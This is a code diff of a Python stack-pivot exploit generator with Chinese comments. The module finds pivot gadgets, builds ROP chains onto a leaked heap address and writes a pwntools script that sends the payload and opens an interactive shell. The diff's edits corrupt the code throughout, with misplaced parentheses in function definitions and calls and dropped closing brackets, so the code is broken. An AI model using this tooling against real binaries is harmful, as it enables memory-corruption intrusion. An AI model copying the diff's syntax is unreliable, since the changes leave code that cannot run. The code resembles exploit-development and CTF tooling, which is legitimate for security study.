@@ -69,13 +69,13 @@ class StackPivotGadget(GadgetInfo):
     
     def to_dict(self) -> Dict[str, Any]:
         base = super().to_dict()
-        base.update({
+        base.update({)
             "pivot_type": self.pivot_type.value,
             "source_register": self.source_register,
             "stack_direction": self.stack_direction,
             "reliability": self.reliability,
             "constraints": self.constraints,
-        })
+        }
         return base
 
 
@@ -207,8 +207,7 @@ class StackPivotGenerator:
         r'lea\s+([a-zA-Z]+),\s*\[([^\]]+)\]\s*;?\s*ret',
     ]
     
-    def __init__(
-        self,
+    def __init__(, self)
         binary_path: str = "",
         arch: str = "amd64",
         max_gadget_length: int = 5
@@ -236,8 +235,7 @@ class StackPivotGenerator:
         self.entry_point: int = 0
         self.sections: Dict[str, Tuple[int, int]] = {}  # name -> (addr, size)
     
-    def scan_gadgets(
-        self,
+    def scan_gadgets(, self)
         disassembly_data: Optional[Dict[int, str]] = None,
         rop_gadgets: Optional[List[GadgetInfo]] = None
     ) -> List[StackPivotGadget]:
@@ -260,8 +258,7 @@ class StackPivotGenerator:
         
         return self.pivot_gadgets
     
-    def _scan_from_disassembly(
-        self,
+    def _scan_from_disassembly(, self)
         disassembly_data: Dict[int, str]
     ) -> None:
         """
@@ -276,15 +273,14 @@ class StackPivotGenerator:
             # 检查是否是栈迁移 gadget
             for pattern, pivot_type in self.PIVOT_PATTERNS:
                 if re.search(pattern, inst_lower, re.IGNORECASE):
-                    gadget = self._create_pivot_gadget(
+                    gadget = self._create_pivot_gadget()
                         addr, instruction, pivot_type, pattern
-                    )
+                    
                     if gadget:
                         self.pivot_gadgets.append(gadget)
                         break
     
-    def _create_pivot_gadget(
-        self,
+    def _create_pivot_gadget(, self)
         address: int,
         instruction: str,
         pivot_type: PivotType,
@@ -302,14 +298,15 @@ class StackPivotGenerator:
         Returns:
             Optional[StackPivotGadget]: 栈迁移 gadget
         """
-        match = re.search(pattern, instruction.lower())
+        match = re.search(pattern, instruction.lower(
+
         source_reg = ""
         
         if match and match.lastindex and match.lastindex >= 1:
             source_reg = match.group(1)
         
         # 创建 gadget
-        gadget = StackPivotGadget(
+        gadget = StackPivotGadget()
             address=address,
             instruction=instruction,
             disassembly=instruction,
@@ -317,7 +314,7 @@ class StackPivotGenerator:
             source_register=source_reg,
             category="stack_pivot",
             quality=self._assess_gadget_quality(instruction),
-        )
+        
         
         # 评估可靠性
         gadget.reliability = self._assess_pivot_reliability(gadget)
@@ -346,7 +343,8 @@ class StackPivotGenerator:
         if 'ret' in instruction and instruction.count(';') <= 1:
             quality += 0.1
         
-        return max(0.0, min(1.0, quality))
+        return max(0.0, min(1.0, quality
+
     
     def _assess_pivot_reliability(self, gadget: StackPivotGadget) -> float:
         """
@@ -377,10 +375,10 @@ class StackPivotGenerator:
         if len(gadget.registers_modified) > 2:
             reliability -= 0.2
         
-        return max(0.0, min(1.0, reliability))
+        return max(0.0, min(1.0, reliability
+
     
-    def generate_pivot_chain(
-        self,
+    def generate_pivot_chain(, self)
         pivot_gadget: StackPivotGadget,
         target_address: int,
         target_size: int = 4096,
@@ -402,20 +400,20 @@ class StackPivotGenerator:
         """
         chain_id = f"pivot_{pivot_gadget.address:x}_{target_region}"
         
-        chain = PivotChain(
+        chain = PivotChain()
             chain_id=chain_id,
             pivot_gadget=pivot_gadget,
             target_region=target_region,
             target_address=target_address,
             target_size=target_size,
             reliability=pivot_gadget.reliability,
-        )
+        
         
         # 添加设置源寄存器的 gadget
         if pivot_gadget.source_register:
-            setup_gadgets = self._find_setup_gadgets(
+            setup_gadgets = self._find_setup_gadgets()
                 pivot_gadget.source_register, rop_gadgets
-            )
+            
             chain.setup_gadgets = setup_gadgets
         
         # 构建在新栈上的 ROP 链（示例）
@@ -427,17 +425,16 @@ class StackPivotGenerator:
             len(chain.setup_gadgets) * 8 +  # setup gadgets
             8 +  # pivot gadget
             len(chain.rop_chain) * 8  # new stack ROP
-        )
+        
         
         chain.description = (
             f"将栈迁移到 {target_region} @ {hex(target_address)}，"
             f"使用 {pivot_gadget.instruction}"
-        )
+        
         
         return chain
     
-    def _find_setup_gadgets(
-        self,
+    def _find_setup_gadgets(, self)
         target_register: str,
         rop_gadgets: Optional[List[GadgetInfo]]
     ) -> List[GadgetInfo]:
@@ -465,8 +462,7 @@ class StackPivotGenerator:
         
         return setup_gadgets
     
-    def _build_new_stack_rop(
-        self,
+    def _build_new_stack_rop(, self)
         rop_gadgets: List[GadgetInfo]
     ) -> List[GadgetInfo]:
         """
@@ -487,8 +483,7 @@ class StackPivotGenerator:
         
         return chain
     
-    def generate_exploit(
-        self,
+    def generate_exploit(, self)
         overflow_size: int,
         pivot_chain: PivotChain,
         goal: str = "shell",
@@ -508,11 +503,11 @@ class StackPivotGenerator:
         """
         exploit_id = f"exploit_{overflow_size}_pivot"
         
-        exploit = ExploitWithPivot(
+        exploit = ExploitWithPivot()
             exploit_id=exploit_id,
             overflow_size=overflow_size,
             pivot_chain=pivot_chain,
-        )
+        
         
         # 确定目标地址
         target_addr = leaked_address or pivot_chain.target_address
@@ -590,7 +585,7 @@ def create_payload():
             script += f'    # {{gadget.instruction}}\n'
             script += f'    payload += p64({gadget.address + self.binary_base})\n'
         
-        script += '''
+        script += ''',
     return payload
 
 def exploit():
@@ -598,7 +593,8 @@ def exploit():
     # 或者本地: p = process("./target")
     
     log.info("发送 payload...")
-    p.sendline(create_payload())
+    p.sendline(create_payload(
+
     
     p.interactive()
 
@@ -626,8 +622,7 @@ if __name__ == "__main__":
         """
         self.rop_gadgets.append(gadget)
     
-    def export_chains(
-        self,
+    def export_chains(, self)
         chains: List[PivotChain],
         output_path: str
     ) -> None:
@@ -652,12 +647,7 @@ if __name__ == "__main__":
         self.logger.info(f"栈迁移链已导出: {output_path}")
 
 
-def generate_stack_pivot_exploit(
-    pivot_gadgets: List[Dict[str, Any]],
-    overflow_size: int,
-    leaked_address: int,
-    target_region: str = "heap"
-) -> ExploitWithPivot:
+def generate_stack_pivot_exploit(, pivot_gadgets: List[Dict[str, Any]], overflow_size: int, leaked_address: int, target_region: str = "heap") -> ExploitWithPivot:
     """
     便捷函数：生成栈迁移利用
     
@@ -674,29 +664,29 @@ def generate_stack_pivot_exploit(
     
     # 添加 pivot gadgets
     for pg in pivot_gadgets:
-        gadget = StackPivotGadget(
+        gadget = StackPivotGadget()
             address=pg['address'],
             instruction=pg['instruction'],
             disassembly=pg['instruction'],
             pivot_type=PivotType(pg.get('type', 'xchg_reg')),
             source_register=pg.get('source_register', ''),
-        )
+        
         generator.add_pivot_gadget(gadget)
     
     if generator.pivot_gadgets:
         # 生成链
-        chain = generator.generate_pivot_chain(
+        chain = generator.generate_pivot_chain()
             generator.pivot_gadgets[0],
             leaked_address,
             target_region=target_region
-        )
+        
         
         # 生成利用
-        exploit = generator.generate_exploit(
+        exploit = generator.generate_exploit()
             overflow_size=overflow_size,
             pivot_chain=chain,
             leaked_address=leaked_address
-        )
+        
         
         return exploit
     
@@ -733,13 +723,13 @@ if __name__ == '__main__':
     ]
     
     for pivot in test_pivots:
-        gadget = StackPivotGadget(
+        gadget = StackPivotGadget()
             address=pivot['address'],
             instruction=pivot['instruction'],
             disassembly=pivot['instruction'],
             pivot_type=PivotType(pivot['type']),
             source_register=pivot.get('source_register', ''),
-        )
+        
         generator.add_pivot_gadget(gadget)
     
     print(f"\n发现 {len(generator.pivot_gadgets)} 个栈迁移 gadgets")
@@ -755,11 +745,11 @@ if __name__ == '__main__':
         best_gadget = max(generator.pivot_gadgets, key=lambda g: g.reliability)
         
         leaked_heap = 0x0000000000600000  # 假设泄露的堆地址
-        chain = generator.generate_pivot_chain(
+        chain = generator.generate_pivot_chain()
             best_gadget,
             target_address=leaked_heap,
             target_region="heap"
-        )
+        
         
         print("\n" + "=" * 60)
         print("栈迁移链")
@@ -771,12 +761,12 @@ if __name__ == '__main__':
         print(f"描述: {chain.description}")
         
         # 生成利用方案
-        exploit = generator.generate_exploit(
+        exploit = generator.generate_exploit()
             overflow_size=72,  # 典型溢出大小
             pivot_chain=chain,
             goal="shell",
             leaked_address=leaked_heap
-        )
+        
         
         print("\n" + "=" * 60)
         print("利用方案")
@@ -790,4 +780,4 @@ if __name__ == '__main__':
         
         print("\nPython 脚本:")
         print("-" * 40)
-        print(exploit.python_exploit[:1000] + "..." if len(exploit.python_exploit) > 1000 else exploit.python_exploit)
+        print(exploit.python_exploit[:1000] + "..." if len(exploit.python_exploit) > 1000 else exploit.python_exploit
